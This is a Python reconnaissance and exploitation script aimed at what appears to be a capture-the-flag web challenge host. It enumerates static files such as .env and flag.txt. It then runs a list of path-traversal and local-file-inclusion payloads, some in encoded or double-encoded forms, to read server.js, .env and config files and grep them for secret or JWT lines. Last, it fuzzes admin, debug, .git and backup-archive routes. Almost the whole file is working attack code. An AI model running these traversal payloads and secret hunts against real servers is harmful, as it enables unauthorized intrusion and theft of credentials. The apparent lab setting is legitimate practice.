#!/usr/bin/env python3
import re, urllib.request, urllib.error

BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"

def req(path, cookie=None, headers=None):
    # do not let urllib normalize away ../ : build opener manually
    r = urllib.request.Request(BASE + path)
    r.add_header("User-Agent", "Mozilla/5.0 recon2")
    if cookie: r.add_header("Cookie", cookie)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        resp = urllib.request.urlopen(r, timeout=40)
        return resp.status, dict(resp.getheaders()), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, f"ERR {e}"

def line(st, p, hh, body):
    is404 = ("Cannot GET" in body) or st == 404
    snip = re.sub(r"\s+", " ", body)[:120]
    tag = "   " if is404 else "***"
    print(f"{tag} {st:>4} {p:48} ct={hh.get('Content-Type','')[:22]:22} {snip}")
    return not is404

print("############ /public/site.css ############")
st, hh, body = req("/public/site.css")
print("status", st, "len", len(body))
print(body[:800])
# any secret-looking comments?
for m in re.findall(r"/\*.*?\*/", body, re.S):
    print("CSS COMMENT:", m[:300])

print("\n############ /public enumeration ############")
pub = ["/public/", "/public", "/public/index.html", "/public/app.js", "/public/main.js",
    "/public/site.js", "/public/script.js", "/public/bundle.js", "/public/server.js",
    "/public/app.py", "/public/index.js", "/public/.env", "/public/config.js",
    "/public/config.json", "/public/secret.txt", "/public/flag.txt", "/public/README.md",
    "/public/package.json", "/public/site.css.map", "/public/robots.txt"]
for p in pub:
    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))

print("\n############ PATH TRAVERSAL / LFI via static ############")
targets = ["server.js", "app.js", "index.js", "package.json", ".env", "config.js"]
trav_tpls = [
    "/public/../{f}",
    "/public/../../{f}",
    "/public/../../../{f}",
    "/public/..%2f{f}",
    "/public/..%2f..%2f{f}",
    "/public/..%2f..%2f..%2f{f}",
    "/public/%2e%2e/{f}",
    "/public/%2e%2e%2f%2e%2e%2f{f}",
    "/public/....//{f}",
    "/public/....//....//{f}",
    "/public/..%252f{f}",
    "/public/%2e%2e%2f{f}",
    "/public/..\\{f}",
    "/public/..%5c{f}",
    "/static/../{f}",
    "/..%2f{f}",
    "/{f}",
]
hit_secret = None
for f in targets:
    for tpl in trav_tpls:
        p = tpl.format(f=f)
        st, hh, body = req(p)
        ok = ("Cannot GET" not in body) and st == 200 and "<!doctype html>" not in body.lower()[:40]
        if ok:
            print(f"*** POSSIBLE LFI {st} {p}")
            print(body[:1500])
            sm = re.search(r"(secret|SECRET|jwt|JWT)[^\n]{0,80}", body)
            if sm: print("   SECRET-LINE:", sm.group(0))

print("\n############ ROUTE FUZZ ############")
routes = ["/dashboard","/manage","/roster","/trade","/transactions","/waivers","/draft",
    "/matchup","/team","/teams","/health","/status","/version","/flag","/api/health",
    "/api/status","/api/flag","/api/team","/api/league","/api/players","/api/scores",
    "/api/user","/api/session","/api/settings","/settings","/console","/admin","/manage",
    "/commissioner/flag","/commissioner/data","/commissioner/console","/lineup",
    "/api/commissioner/settings","/api/v1","/graphql","/whoami","/debug","/env",
    "/.git/HEAD","/.git/config","/backup.zip","/source.zip","/app.zip","/site.zip"]
for p in routes:
    line(*(lambda t: (t[0], p, t[1], t[2]))(req(p)))

print("\nDONE")
